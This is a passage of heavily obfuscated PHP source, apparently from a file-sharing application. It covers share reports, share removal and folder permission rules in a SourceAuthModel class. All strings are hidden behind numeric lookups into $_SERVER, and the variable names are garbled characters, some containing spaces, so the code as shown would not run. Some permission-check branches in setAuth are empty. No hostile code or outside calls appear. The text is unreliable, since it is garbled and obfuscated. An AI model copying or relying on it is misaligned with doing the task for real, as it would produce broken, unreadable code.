$ÃÌğì¼¦ =& $_SERVER[çâ¥×ø³]; $œ¿ºˆï€ = $this->getInfo($¾®çºñÜ); if (!$œ¿ºˆï€) { return !1; } $this->_checkLinkShare($ñ‡¶ÊÑ, $œ¿ºˆï€); $ÄêÒÛµ¶ = array(); $À’âœÉÒ = explode($ÃÌğì¼¦[50], $ÃÌğì¼¦[2064]); foreach ($À’âœÉÒ as $öÕ«ª™) { if (!array_key_exists($öÕ«ª™, $ñ‡¶ÊÑ)) { continue; } $ÄêÒÛµ¶[$öÕ«ª™] = $ñ‡¶ÊÑ[$öÕ«ª™]; } $this->shareEventAdd($œ¿ºˆï€[$ÃÌğì¼¦[181]], $ñ‡¶ÊÑ, $ÃÌğì¼¦[1869]); $this->where(array($ÃÌğì¼¦[2062] => $¾®çºñÜ))->save($ÄêÒÛµ¶); if (isset($ñ‡¶ÊÑ[$ÃÌğì¼¦[2050]])) { $this->_shareAuthSet($¾®çºñÜ, $ñ‡¶ÊÑ[$ÃÌğì¼¦[2050]]); } return !0; } private function _checkLinkShare($Î«ãöˆ, $ÀÉéú³) { $òë„ ıŞ =& $_SERVER[çâ¥×ø³]; if ($Î«ãöˆ[$òë„ ıŞ[530]] != $òë„ ıŞ[88]) { return; } $Äö „ÄÈ = $ÀÉéú³[$òë„ ıŞ[87]][$òë„ ıŞ[181]]; if ($ÀÉéú³[$òë„ ıŞ[87]][$òë„ ıŞ[33]] != $òë„ ıŞ[214]) { $´¾­©Ö = $this->_folderReport($Äö „ÄÈ); if (!$´¾­©Ö) { return; } show_json(LNG($òë„ ıŞ[2065]) . $òë„ ıŞ[2066] . $´¾­©Ö, !1); } $™ïÀÏã = Model($òë„ ıŞ[874])->fileInfoGet($ÀÉéú³[$òë„ ıŞ[87]][$òë„ ıŞ[181]]); if (!$™ïÀÏã) { return; } $¥ñ —¨¢ = $this->shareFileMeta($™ïÀÏã[$òë„ ıŞ[509]]); if (isset($¥ñ —¨¢[$òë„ ıŞ[418]]) && $¥ñ —¨¢[$òë„ ıŞ[418]] == $òë„ ıŞ[88]) { show_json(LNG($òë„ ıŞ[2067]), !1); } } private function _folderReport($×öõŸ¹Š) { $é½¥•Á =& $_SERVER[çâ¥×ø³]; $îûİ¬Ç‚ = array($é½¥•Á[509] => array($é½¥•Á[1065], 0), $é½¥•Á[799] => 3); $®¡§‚ÄÀ = Model($é½¥•Á[2068])->where($îûİ¬Ç‚)->field($é½¥•Á[509])->select(); if (!$®¡§‚ÄÀ) { return !1; } $®¡§‚ÄÀ = array_to_keyvalue($®¡§‚ÄÀ, $é½¥•Á[12], $é½¥•Á[509]); $–à…¸†è = $é½¥•Á[50] . $×öõŸ¹Š . $é½¥•Á[50]; $îûİ¬Ç‚ = array($é½¥•Á[509] => array($é½¥•Á[7], $®¡§‚ÄÀ), $é½¥•Á[553] => array($é½¥•Á[427], "\45{$–à…¸†è}\45"), $é½¥•Á[473] => 0); $™€ñë¬– = Model($é½¥•Á[874])->where($îûİ¬Ç‚)->field($é½¥•Á[2069])->find(); if (!$™€ñë¬–) { return !1; } $Ô†±Í­ = substr($™€ñë¬–[$é½¥•Á[553]], strpos($™€ñë¬–[$é½¥•Á[553]], $–à…¸†è)); $îûİ¬Ç‚ = array($é½¥•Á[181] => array($é½¥•Á[7], trim($Ô†±Í­, $é½¥•Á[50]))); $ëĞ±ÉøÌ = Model($é½¥•Á[874])->where($îûİ¬Ç‚)->field($é½¥•Á[32])->select(); $ëº‚Î = array_to_keyvalue($ëĞ±ÉøÌ, $é½¥•Á[12], $é½¥•Á[32]); $ëº‚Î[] = $™€ñë¬–[$é½¥•Á[32]]; return implode($é½¥•Á[8], $ëº‚Î); } protected function remove($Î‘ƒÆĞ) { $‡‰õú =& $_SERVER[çâ¥×ø³]; if (is_array($Î‘ƒÆĞ)) { $Î‘ƒÆĞ = array($‡‰õú[7], $Î‘ƒÆĞ); } $ıü‡¥çå = array($‡‰õú[633] => $Î‘ƒÆĞ); $‘Ñöü± = $this->where($ıü‡¥çå)->delete(); if ($‘Ñöü±) { Model($‡‰õú[634])->where(array($‡‰õú[633] => $Î‘ƒÆĞ))->delete(); } $µ±Ô‡€· = is_array($Î‘ƒÆĞ) ? $Î‘ƒÆĞ[1] : array($Î‘ƒÆĞ); for ($ÚøÒÃº = 0; $ÚøÒÃº < count($µ±Ô‡€·); $ÚøÒÃº++) { $‹øÖªŸ = $this->getInfo($µ±Ô‡€·[$ÚøÒÃº]); if ($‹øÖªŸ[$‡‰õú[631]] == $‡‰õú[88]) { Model($‡‰õú[601])->eventShare($‹øÖªŸ[$‡‰õú[181]], $‡‰õú[2056]); } if ($‹øÖªŸ[$‡‰õú[530]] == $‡‰õú[88]) { Model($‡‰õú[601])->eventShare($‹øÖªŸ[$‡‰õú[181]], $‡‰õú[2055]); } } return $‘Ñöü±; } protected function removeBySource($¶úÛ×Ë) { $Ñ´ÅøÇÄ =& $_SERVER[çâ¥×ø³]; $‘âŒ‡áı = array($Ñ´ÅøÇÄ[459] => array($Ñ´ÅøÇÄ[460], $¶úÛ×Ë)); $«Ñ™™•ğ = $this->field($Ñ´ÅøÇÄ[633])->where($‘âŒ‡áı)->select(); $«Ñ™™•ğ = array_to_keyvalue($«Ñ™™•ğ, $Ñ´ÅøÇÄ[12], $Ñ´ÅøÇÄ[633]); if (!$«Ñ™™•ğ) { return; } $‘âŒ‡áı = array($Ñ´ÅøÇÄ[2062] => array($Ñ´ÅøÇÄ[460], $«Ñ™™•ğ)); $this->where($‘âŒ‡áı)->delete(); Model($Ñ´ÅøÇÄ[634])->where($‘âŒ‡áı)->delete(); } public function listAll($»¡áÅÚ) { $Ïšï…£é =& $_SERVER[çâ¥×ø³]; $òÅù–·® = array(); if ($»¡áÅÚ[$Ïšï…£é[1701]]) { $òÅù–·®[$Ïšï…£é[1701]] = $»¡áÅÚ[$Ïšï…£é[1701]]; } if ($»¡áÅÚ[$Ïšï…£é[809]]) { $ÃÊ«±‚• = $»¡áÅÚ[$Ïšï…£é[810]] ? $»¡áÅÚ[$Ïšï…£é[810]] : strtotime(date($Ïšï…£é[2070])); $òÅù–·®[$Ïšï…£é[215]] = array($Ïšï…£é[377], array($»¡áÅÚ[$Ïšï…£é[809]], $ÃÊ«±‚•)); } if ($»¡áÅÚ[$Ïšï…£é[33]]) { $òÅù–·®[$»¡áÅÚ[$Ïšï…£é[33]]] = 1; } else { $òÅù–·®[] = array($Ïšï…£é[530] => array($Ïšï…£é[1065], 0), $Ïšï…£é[631] => array($Ïšï…£é[1065], 0), $Ïšï…£é[2044] => $Ïšï…£é[1997]); } if ($»¡áÅÚ[$Ïšï…£é[1993]]) { $òÅù–·®[] = array($Ïšï…£é[2041] => $»¡áÅÚ[$Ïšï…£é[1993]], $Ïšï…£é[1598] => array($Ïšï…£é[427], "\x25{$»¡áÅÚ[$Ïšï…£é[1993]]}\x25"), $Ïšï…£é[2044] => $Ïšï…£é[1997]); } $±ÅÉš¹³ = $this->_makeOrder()->where($òÅù–·®)->selectPage(20); if (empty($±ÅÉš¹³[$Ïšï…£é[413]])) { return array(); } $this->_listDataApply($±ÅÉš¹³[$Ïšï…£é[413]]); return $±ÅÉš¹³; } public function listDataApply($ğå«¹ÉÛ) { $this->_listDataApply($ğå«¹ÉÛ); return $ğå«¹ÉÛ; } private function _listDataApply(&$¾á¥ªª) { $ÀÍÀø =& $_SERVER[çâ¥×ø³]; $‚¬ÙÂîé = array_to_keyvalue($¾á¥ªª, $ÀÍÀø[12], $ÀÍÀø[1701]); $ô‹¡Ãü‚ = Model($ÀÍÀø[567])->userListInfo(array_unique($‚¬ÙÂîé)); $âóùøï± = array_to_keyvalue($¾á¥ªª, $ÀÍÀø[12], $ÀÍÀø[181]); $şçîø¨ü = Model($ÀÍÀø[874])->sourceListInfo($âóùøï±, !0); foreach ($¾á¥ªª as $ëúı—¡  => &$²¥šÆ¥§) { $ìïÀŒò = $²¥šÆ¥§[$ÀÍÀø[1701]]; $²¥šÆ¥§[$ÀÍÀø[2071]] = $ô‹¡Ãü‚[$ìïÀŒò] ? $ô‹¡Ãü‚[$ìïÀŒò] : !1; $µĞ¸À‰à = $²¥šÆ¥§[$ÀÍÀø[181]]; $²¥šÆ¥§[$ÀÍÀø[87]] = $şçîø¨ü[$µĞ¸À‰à] ? $şçîø¨ü[$µĞ¸À‰à] : !1; if ($²¥šÆ¥§[$ÀÍÀø[87]][$ÀÍÀø[473]] == $ÀÍÀø[88]) { unset($¾á¥ªª[$ëúı—¡ ]); } if ($²¥šÆ¥§[$ÀÍÀø[87]] != $ÀÍÀø[212] && !$²¥šÆ¥§[$ÀÍÀø[87]]) { unset($¾á¥ªª[$ëúı—¡ ]); } } unset($²¥šÆ¥§); $¾á¥ªª = array_values($¾á¥ªª); } private function _makeOrder($”Ï‰Ö = '') { $£³¶Ğú =& $_SERVER[çâ¥×ø³]; $Ğ´¡„â´ = array($£³¶Ğú[215], $£³¶Ğú[810], $£³¶Ğú[2058], $£³¶Ğú[2059]); $…ÅŠ­óŸ = array($£³¶Ğú[491] => $£³¶Ğú[492], $£³¶Ğú[493] => $£³¶Ğú[494]); $óòñÓ£™ = Input::get($£³¶Ğú[498], $£³¶Ğú[7], $£³¶Ğú[465], $Ğ´¡„â´); $â›¾şÈÓ = Input::get($£³¶Ğú[499], $£³¶Ğú[7], $£³¶Ğú[2072], array($£³¶Ğú[1990], $£³¶Ğú[493])); $â›¾şÈÓ = $…ÅŠ­óŸ[$â›¾şÈÓ]; $”Ï‰Ö = $”Ï‰Ö . "{$óòñÓ£™}\x20{$â›¾şÈÓ}"; return $this->order($”Ï‰Ö); } public function reportAdd($ıÎğÁÔÚ) { $‹â¬âƒ° =& $_SERVER[çâ¥×ø³]; $å§Ç˜ = array($‹â¬âƒ°[633] => $ıÎğÁÔÚ[$‹â¬âƒ°[633]], $‹â¬âƒ°[1701] => USER_ID); if (Model($‹â¬âƒ°[2068])->where($å§Ç˜)->find()) { return !1; } $ì¼ŞÏ¡ = array($‹â¬âƒ°[633] => $ıÎğÁÔÚ[$‹â¬âƒ°[633]], $‹â¬âƒ°[1598] => $ıÎğÁÔÚ[$‹â¬âƒ°[1598]], $‹â¬âƒ°[181] => $ıÎğÁÔÚ[$‹â¬âƒ°[181]], $‹â¬âƒ°[509] => $ıÎğÁÔÚ[$‹â¬âƒ°[509]], $‹â¬âƒ°[1701] => USER_ID, $‹â¬âƒ°[33] => $ıÎğÁÔÚ[$‹â¬âƒ°[33]], $‹â¬âƒ°[494] => $ıÎğÁÔÚ[$‹â¬âƒ°[494]]); return Model($‹â¬âƒ°[2068])->add($ì¼ŞÏ¡); } public function reportList($Ìµ›³·ü) { $Ì‚°íªÇ =& $_SERVER[çâ¥×ø³]; $„¶İ¦¹ = array(); if ($Ìµ›³·ü[$Ì‚°íªÇ[809]]) { $Ê‹ÑÔ»µ = $Ìµ›³·ü[$Ì‚°íªÇ[810]] ? $Ìµ›³·ü[$Ì‚°íªÇ[810]] : strtotime(date($Ì‚°íªÇ[2070])); $„¶İ¦¹[$Ì‚°íªÇ[215]] = array($Ì‚°íªÇ[377], array($Ìµ›³·ü[$Ì‚°íªÇ[809]], $Ê‹ÑÔ»µ)); } if (isset($Ìµ›³·ü[$Ì‚°íªÇ[33]]) && in_array($Ìµ›³·ü[$Ì‚°íªÇ[33]], array($Ì‚°íªÇ[88], $Ì‚°íªÇ[478], $Ì‚°íªÇ[2073], $Ì‚°íªÇ[2074], $Ì‚°íªÇ[2075]))) { $„¶İ¦¹[$Ì‚°íªÇ[33]] = $Ìµ›³·ü[$Ì‚°íªÇ[33]]; } if (isset($Ìµ›³·ü[$Ì‚°íªÇ[799]]) && in_array($Ìµ›³·ü[$Ì‚°íªÇ[799]], array($Ì‚°íªÇ[212], $Ì‚°íªÇ[88], $Ì‚°íªÇ[478], $Ì‚°íªÇ[2073]))) { $„¶İ¦¹[$Ì‚°íªÇ[799]] = $Ìµ›³·ü[$Ì‚°íªÇ[799]]; } $ÓŒ‹©üë = Input::get($Ì‚°íªÇ[499], $Ì‚°íªÇ[7], $Ì‚°íªÇ[2072], array($Ì‚°íªÇ[1990], $Ì‚°íªÇ[493])); $¸ıÖµÆø = array($Ì‚°íªÇ[491] => $Ì‚°íªÇ[492], $Ì‚°íªÇ[493] => $Ì‚°íªÇ[494]); $¼Ó¤Í¢´ = $Ì‚°íªÇ[2076] . $¸ıÖµÆø[$ÓŒ‹©üë]; $Î÷å¿„Ô = Model($Ì‚°íªÇ[2068])->where($„¶İ¦¹)->order($¼Ó¤Í¢´)->selectPage(20); if (empty($Î÷å¿„Ô[$Ì‚°íªÇ[413]])) { return array(); } $ìÛâ¼¤Õ = array_to_keyvalue_group($Î÷å¿„Ô[$Ì‚°íªÇ[413]], $Ì‚°íªÇ[799], $Ì‚°íªÇ[633]); if (!empty($ìÛâ¼¤Õ[0])) { $Ìµ›³·ü = $ìÛâ¼¤Õ[0]; $„¶İ¦¹ = array($Ì‚°íªÇ[633] => array($Ì‚°íªÇ[7], $Ìµ›³·ü)); $†¨¦Ó·õ = $this->where($„¶İ¦¹)->field($Ì‚°íªÇ[633])->select(); $†¨¦Ó·õ = array_to_keyvalue($†¨¦Ó·õ, $Ì‚°íªÇ[12], $Ì‚°íªÇ[633]); $µ×â’Ã§ = array_diff($Ìµ›³·ü, $†¨¦Ó·õ); if (!empty($µ×â’Ã§)) { foreach ($Î÷å¿„Ô[$Ì‚°íªÇ[413]] as $¶£ôàÃ => $¥™Êõä) { if (in_array($¥™Êõä[$Ì‚°íªÇ[633]], $µ×â’Ã§)) { unset($Î÷å¿„Ô[$Ì‚°íªÇ[413]][$¶£ôàÃ]); } } } } $this->_listDataApply($Î÷å¿„Ô[$Ì‚°íªÇ[413]]); return $Î÷å¿„Ô; } public function reportStatus($šÃµ­­¶) { $ÄÜ½›é´ =& $_SERVER[çâ¥×ø³]; $Ì®Õ¢Õà = array($ÄÜ½›é´[443] => $šÃµ­­¶[$ÄÜ½›é´[443]]); $Ç«Ù¥ = Model($ÄÜ½›é´[2068])->where($Ì®Õ¢Õà)->field($ÄÜ½›é´[2077])->find(); if (!$Ç«Ù¥) { return !1; } $†ÃõŸ½³ = array($ÄÜ½›é´[799] => $šÃµ­­¶[$ÄÜ½›é´[799]]); if ($šÃµ­­¶[$ÄÜ½›é´[799]] == $ÄÜ½›é´[2073] && $Ç«Ù¥[$ÄÜ½›é´[799]] == $ÄÜ½›é´[2073]) { $†ÃõŸ½³[$ÄÜ½›é´[799]] = 0; } $†íû“Ÿ = Model($ÄÜ½›é´[2068])->where($Ì®Õ¢Õà)->save($†ÃõŸ½³); if ($šÃµ­­¶[$ÄÜ½›é´[799]] == $ÄÜ½›é´[478]) { if ($Ç«Ù¥[$ÄÜ½›é´[509]] != $ÄÜ½›é´[212] && $this->shareFileMeta($Ç«Ù¥[$ÄÜ½›é´[509]])) { $this->shareFileMeta($Ç«Ù¥[$ÄÜ½›é´[509]], 0); } $this->remove($Ç«Ù¥[$ÄÜ½›é´[633]]); return !0; } if ($†íû“Ÿ && $šÃµ­­¶[$ÄÜ½›é´[799]] == $ÄÜ½›é´[2073]) { $­ğ› õ¨ = $†ÃõŸ½³[$ÄÜ½›é´[799]] == $ÄÜ½›é´[2073] ? 1 : 0; $this->shareFileMeta($Ç«Ù¥[$ÄÜ½›é´[509]], $­ğ› õ¨); $this->removeByFile($Ç«Ù¥[$ÄÜ½›é´[509]]); } return $†íû“Ÿ; } private function removeByFile($û˜Á¾ï) { $£çØé‹„ =& $_SERVER[çâ¥×ø³]; $ò«ñ¯¢® = Model($£çØé‹„[874])->where(array($£çØé‹„[509] => $û˜Á¾ï))->field($£çØé‹„[181])->select(); $¨¿íñèÏ = array_to_keyvalue($ò«ñ¯¢®, $£çØé‹„[12], $£çØé‹„[181]); $«å¼‰É = array($£çØé‹„[181] => array($£çØé‹„[7], $¨¿íñèÏ), $£çØé‹„[530] => 1); $ò«ñ¯¢® = $this->where($«å¼‰É)->field($£çØé‹„[633])->select(); if (empty($ò«ñ¯¢®)) { return; } $è¹ÇªÊ = array_to_keyvalue($ò«ñ¯¢®, $£çØé‹„[12], $£çØé‹„[633]); $this->remove($è¹ÇªÊ); } private function shareFileMeta($‰óÙş„, $Ş”ÉÄÈ = null) { $ğŞÅíİš =& $_SERVER[çâ¥×ø³]; $ó»¢Ö´¼ = array($ğŞÅíİš[509] => $‰óÙş„, $ğŞÅíİš[94] => $ğŞÅíİš[2078]); if (is_null($Ş”ÉÄÈ)) { return Model($ğŞÅíİš[2079])->where($ó»¢Ö´¼)->find(); } $ó»¢Ö´¼[$ğŞÅíİš[418]] = $Ş”ÉÄÈ; Model($ğŞÅíİš[2079])->add($ó»¢Ö´¼, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\165\x72\143\145\137\141\165\164\x68"; public function getAuth($òï‘Ï) { $òÎ©§ËŸ =& $_SERVER[çâ¥×ø³]; $ãû¾Ï¾ş = $this->sourceAuthSelect($òï‘Ï); $ò÷€¢ = array(); $áœ“ã½š = array(); $â¤«»¯ = 2 << 25; foreach ($ãû¾Ï¾ş as $Áää‡Ô) { $›»Û¶ = Model($òÎ©§ËŸ[540])->listData($Áää‡Ô[$òÎ©§ËŸ[2003]]); if (!$›»Û¶) { continue; } $ò÷€¢[] = $Áää‡Ô; $›ûŠªÃ = 0; if ($Áää‡Ô[$òÎ©§ËŸ[178]] == SourceModel::TYPE_GROUP) { $›ûŠªÃ = $â¤«»¯ * 2; } if ($Áää‡Ô[$òÎ©§ËŸ[178]] == SourceModel::TYPE_USER) { $›ûŠªÃ = $â¤«»¯; } if ($Áää‡Ô[$òÎ©§ËŸ[178]] == SourceModel::TYPE_USER && $Áää‡Ô[$òÎ©§ËŸ[538]] == $òÎ©§ËŸ[212]) { $›ûŠªÃ = 0; } $áœ“ã½š[] = $›»Û¶[$òÎ©§ËŸ[455]] + $›ûŠªÃ; } array_multisort($áœ“ã½š, SORT_DESC, $ò÷€¢); return $ò÷€¢; } public function sourceAuthSelect($’£ÓƒÁú) { $ÙÎŞÆÁ =& $_SERVER[çâ¥×ø³]; static $ºØ²üÙ = array(); $ÜŒ•ÁŸ” = is_array($’£ÓƒÁú) ? !1 : !0; if ($ÜŒ•ÁŸ”) { $’£ÓƒÁú = array($’£ÓƒÁú); } $œï‚´—Ì = array(); foreach ($’£ÓƒÁú as $ç¾ÒùÄ) { if (isset($ºØ²üÙ[$ç¾ÒùÄ])) { $œï‚´—Ì[$ç¾ÒùÄ] = $ºØ²üÙ[$ç¾ÒùÄ]; } } if (count($œï‚´—Ì) == count($’£ÓƒÁú)) { return $ÜŒ•ÁŸ” ? $œï‚´—Ì[$’£ÓƒÁú[0]] : $œï‚´—Ì; } $¯Ğ©€Œ‹ = $ÙÎŞÆÁ[2080]; $íø‹ú–° = array($ÙÎŞÆÁ[181] => array($ÙÎŞÆÁ[7], $’£ÓƒÁú)); $ë‘ÄµÖ÷ = $this->field($¯Ğ©€Œ‹)->order($ÙÎŞÆÁ[443])->where($íø‹ú–°)->select(); $Æ®ßĞï‘ = array_to_keyvalue_group($ë‘ÄµÖ÷, $ÙÎŞÆÁ[181]); foreach ($’£ÓƒÁú as $ç¾ÒùÄ) { $ºØ²üÙ[$ç¾ÒùÄ] = $Æ®ßĞï‘[$ç¾ÒùÄ] ? $Æ®ßĞï‘[$ç¾ÒùÄ] : array(); } if ($ÜŒ•ÁŸ”) { return $ë‘ÄµÖ÷; } return $Æ®ßĞï‘; } public function setAuth($‡Î×€ú–, $‡øÅ“²) { $õ¤÷ÍĞÑ =& $_SERVER[çâ¥×ø³]; $âÑßïà‚ = Model($õ¤÷ÍĞÑ[1385])->sourceInfo($‡Î×€ú–); if (!$âÑßïà‚) { return !1; } if ($âÑßïà‚[$õ¤÷ÍĞÑ[178]] != SourceModel::TYPE_GROUP) { return !1; } $¶°ª¼ŞŞ = 1; $æÑ‹àõ = $âÑßïà‚[$õ¤÷ÍĞÑ[538]]; if ($æÑ‹àõ != $¶°ª¼ŞŞ) { $¨·ˆ„é… = array($õ¤÷ÍĞÑ[1899] => $æÑ‹àõ); $ııº­Ê = Model($õ¤÷ÍĞÑ[1989])->field($õ¤÷ÍĞÑ[1701])->where($¨·ˆ„é…)->select(); $ııº­Ê = array_to_keyvalue($ııº­Ê, $õ¤÷ÍĞÑ[12], $õ¤÷ÍĞÑ[1701]); } $ˆİªåá = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $’Ä´Óà• = array(); foreach ($‡øÅ“² as $ßÑÈÍÑÃ) { if (!in_array($ßÑÈÍÑÃ[$õ¤÷ÍĞÑ[178]], $ˆİªåá)) { show_json(LNG($õ¤÷ÍĞÑ[2081]), !1); } if ($æÑ‹àõ != $¶°ª¼ŞŞ) { if ($ßÑÈÍÑÃ[$õ¤÷ÍĞÑ[178]] == SourceModel::TYPE_GROUP) { } if ($ßÑÈÍÑÃ[$õ¤÷ÍĞÑ[538]] != 0 && !in_array($ßÑÈÍÑÃ[$õ¤÷ÍĞÑ[538]], $ııº­Ê)) { } } if ($ßÑÈÍÑÃ[$õ¤÷ÍĞÑ[538]] == 0) { $ßÑÈÍÑÃ[$õ¤÷ÍĞÑ[178]] = SourceModel::TYPE_USER; } $’Ä´Óà•[] = array($õ¤÷ÍĞÑ[181] => $‡Î×€ú–, $õ¤÷ÍĞÑ[178] => intval($ßÑÈÍÑÃ[$õ¤÷ÍĞÑ[178]]), $õ¤÷ÍĞÑ[538] => intval($ßÑÈÍÑÃ[$õ¤÷ÍĞÑ[538]]), $õ¤÷ÍĞÑ[2003] => intval($ßÑÈÍÑÃ[$õ¤÷ÍĞÑ[2003]]) ? intval($ßÑÈÍÑÃ[$õ¤÷ÍĞÑ[2003]]) : 0, $õ¤÷ÍĞÑ[2063] => intval($ßÑÈÍÑÃ[$õ¤÷ÍĞÑ[2063]]) ? intval($ßÑÈÍÑÃ[$õ¤÷ÍĞÑ[2063]]) : -1); } $this->where(array($õ¤÷ÍĞÑ[459] => $‡Î×€ú–))->delete(); $this->addAll($’Ä´Óà•); return !0; } public function authClear($¦ÃîàÛ) { $ÛÎË´Š« =& $_SERVER[çâ¥×ø³]; $Ø¨½î¢† = Model($ÛÎË´Š«[1385])->sourceInfo($¦ÃîàÛ); $†œåß = array($¦ÃîàÛ); if ($Ø¨½î¢†[$ÛÎË´Š«[453]] == $ÛÎË´Š«[88]) { $Ã¯öàœÄ = array($ÛÎË´Š«[620] => array($ÛÎË´Š«[580], $Ø¨½î¢†[$ÛÎË´Š«[553]] . $¦ÃîàÛ . $ÛÎË´Š«[581])); $†œåß = Model($ÛÎË´Š«[1385])->field($ÛÎË´Š«[459])->where($Ã¯öàœÄ)->getField($ÛÎË´Š«[181], !0); $†œåß[] = $¦ÃîàÛ; } $this->where(array($ÛÎË´Š«[459] => array($ÛÎË´Š«[460], $†œåß)))->delete(); return !0; } public function getAllChildren($²˜§û§) { $†•š„§º =& $_SERVER[çâ¥×ø³]; $Šé¹ÁÎÂ = Model($†•š„§º[1385])->sourceInfo($²˜§û§); if ($Šé¹ÁÎÂ[$†•š„§º[453]] != $†•š„§º[88]) { return $this->sourceListAuth(array($²˜§û§)); } if ($Šé¹ÁÎÂ[$†•š„§º[178]] != SourceModel::TYPE_GROUP) { return array(); } $™êõöŒ = 1; $›¼Â¡¡æ = array($²˜§û§); if ($Šé¹ÁÎÂ[$†•š„§º[180]] == $†•š„§º[212] && $Šé¹ÁÎÂ[$†•š„§º[538]] != $™êõöŒ) { $›¼Â¡¡æ = $this->groupChidldAllRootSource($Šé¹ÁÎÂ[$†•š„§º[538]]); } $Ú¥áª³É = $this->field($†•š„§º[181])->group($†•š„§º[181])->select(); $Ú¥áª³É = array_to_keyvalue($Ú¥áª³É, $†•š„§º[12], $†•š„§º[181]); if (!$Ú¥áª³É) { return array(); } $éÊüÙÔ” = $†•š„§º[2082]; $ÙØø¾²Ó = array($†•š„§º[181] => array($†•š„§º[7], $Ú¥áª³É), $†•š„§º[473] => $†•š„§º[212]); $õúÀÍÒô = Model($†•š„§º[874])->field($éÊüÙÔ”)->where($ÙØø¾²Ó)->select(); $·™°ôƒ¼ = array($²˜§û§); foreach ($õúÀÍÒô as $É ‰ì) { foreach ($›¼Â¡¡æ as $Äèşâøà) { $¿¡ÑËëë = $†•š„§º[50] . $Äèşâøà . $†•š„§º[50]; $†¢Š«‘‡ = $É ‰ì[$†•š„§º[553]] . $É ‰ì[$†•š„§º[181]] . $†•š„§º[50]; if (strstr($†¢Š«‘‡, $¿¡ÑËëë)) { $·™°ôƒ¼[] = $É ‰ì[$†•š„§º[181]]; break; } } } return $this->sourceListAuth($·™°ôƒ¼); } private function sourceListAuth($ö³âİ) { $Œ ¶µŠ¹ =& $_SERVER[çâ¥×ø³]; $Ñ¬İŞ¶ò = Model($Œ ¶µŠ¹[1385])->sourceListInfo($ö³âİ, !0); $‹ÖÄÁà¤ = $this->sourceAuthSelect($ö³âİ); $Õ š¼úØ = array(); $™œª–ïÎ = array(); foreach ($Ñ¬İŞ¶ò as $—Ú€ÚŞé) { unset($—Ú€ÚŞé[$Œ ¶µŠ¹[497]]); unset($—Ú€ÚŞé[$Œ ¶µŠ¹[495]]); unset($—Ú€ÚŞé[$Œ ¶µŠ¹[455]]); unset($—Ú€ÚŞé[$Œ ¶µŠ¹[87]]); $¶Ïöïå° = $‹ÖÄÁà¤[$—Ú€ÚŞé[$Œ ¶µŠ¹[181]]]; if (!$¶Ïöïå°) { continue; } $—Ú€ÚŞé[$Œ ¶µŠ¹[2083]] = $this->authTargetInfo($¶Ïöïå°); $—Ú€ÚŞé[$Œ ¶µŠ¹[551]] = rtrim($—Ú€ÚŞé[$Œ ¶µŠ¹[557]], $Œ ¶µŠ¹[8]) . $Œ ¶µŠ¹[8] . ltrim($—Ú€ÚŞé[$Œ ¶µŠ¹[551]], $Œ ¶µŠ¹[8]); $Õ š¼úØ[] = $—Ú€ÚŞé; $áÚÎ„ƒÅ = count(explode($Œ ¶µŠ¹[8], trim($—Ú€ÚŞé[$Œ ¶µŠ¹[551]], $Œ ¶µŠ¹[8]))); $™œª–ïÎ[] = $áÚÎ„ƒÅ + ($—Ú€ÚŞé[$Œ ¶µŠ¹[33]] == $Œ ¶µŠ¹[75] ? 0 : 1000); } array_multisort($™œª–ïÎ, SORT_ASC, $Õ š¼úØ); return $Õ š¼úØ; } private function groupChidldAllRootSource($Ø…öåš) { $÷ùÚ³ë =& $_SERVER[çâ¥×ø³]; $ËóÉ”áê = Model($÷ùÚ³ë[2084])->groupChildrenAll($Ø…öåš); $ÔÄÉâã’ = array($÷ùÚ³ë[180] => 0, $÷ùÚ³ë[538] => array($÷ùÚ³ë[7], $ËóÉ”áê), $÷ùÚ³ë[178] => SourceModel::TYPE_GROUP); $×¾Û©­Ñ = Model($÷ùÚ³ë[874])->field($÷ùÚ³ë[181])->where($ÔÄÉâã’)->select(); $×¾Û©­Ñ = array_to_keyvalue($×¾Û©­Ñ, $÷ùÚ³ë[12], $÷ùÚ³ë[181]); return $×¾Û©­Ñ; } private function authTargetInfo($µÎùğÀï) { $ÔõØ„ª =& $_SERVER[çâ¥×ø³]; $²Ùºµ = array(); $»™Îàˆ¥ = array(); $‚Ñ’ß³ô = 2 << 25; foreach ($µÎùğÀï as $£‘…À‹ß) { $¼€¡ó‰¸ = Model($ÔõØ„ª[540])->listData($£‘…À‹ß[$ÔõØ„ª[2003]]); if (!$¼€¡ó‰¸) { continue; } if ($£‘…À‹ß[$ÔõØ„ª[178]] == SourceModel::TYPE_USER) { $é×·¶Àş = Model($ÔõØ„ª[546])->getInfoSimpleOuter($£‘…À‹ß[$ÔõØ„ª[538]]); if ($é×·¶Àş[$ÔõØ„ª[1701]] == $ÔõØ„ª[1241]) { continue; } if ($é×·¶Àş[$ÔõØ„ª[1701]] == $ÔõØ„ª[212]) { $é×·¶Àş[$ÔõØ„ª[32]] = LNG($ÔõØ„ª[2085]); } } else { $é×·¶Àş = Model($ÔõØ„ª[554])->getInfoSimple($£‘…À‹ß[$ÔõØ„ª[538]]); } if (!$é×·¶Àş) { continue; } $é×·¶Àş[$ÔõØ„ª[508]] = $¼€¡ó‰¸; $²Ùºµ[] = $é×·¶Àş; $‚âÊÆ±‚ = 0; if ($£‘…À‹ß[$ÔõØ„ª[178]] == SourceModel::TYPE_GROUP) { $‚âÊÆ±‚ = $‚Ñ’ß³ô * 2; } if ($£‘…À‹ß[$ÔõØ„ª[178]] == SourceModel::TYPE_USER) { $‚âÊÆ±‚ = $‚Ñ’ß³ô; } if ($£‘…À‹ß[$ÔõØ„ª[178]] == SourceModel::TYPE_USER && $£‘…À‹ß[$ÔõØ„ª[538]] == $ÔõØ„ª[212]) { $‚âÊÆ±‚ = 0; } $»™Îàˆ¥[] = $¼€¡ó‰¸[$ÔõØ„ª[455]] + $‚âÊÆ±‚; } array_multisort($»™Îàˆ¥, SORT_DESC, $²Ùºµ); return $²Ùºµ; } public function getAllChildrenByUser($°±í·Â‘, $ºæıÖç) { $ÜÃû±¼ =& $_SERVER[çâ¥×ø³]; $ÈÃ’­ = Model($ÜÃû±¼[567])->getInfo($ºæıÖç); if (!$ºæıÖç || !$°±í·Â‘ || !$ÈÃ’­) { return array(); } $÷ğİôÔœ = Model($ÜÃû±¼[1385])->sourceInfo($°±í·Â‘); $À¯ÌŸ–† = array(); $õ‹÷æû× = 1; if ($÷ğİôÔœ[$ÜÃû±¼[180]] == $ÜÃû±¼[212] && $÷ğİôÔœ[$ÜÃû±¼[538]] != $õ‹÷æû× && $this->groupContainUser($÷ğİôÔœ[$ÜÃû±¼[538]], $ºæıÖç)) { 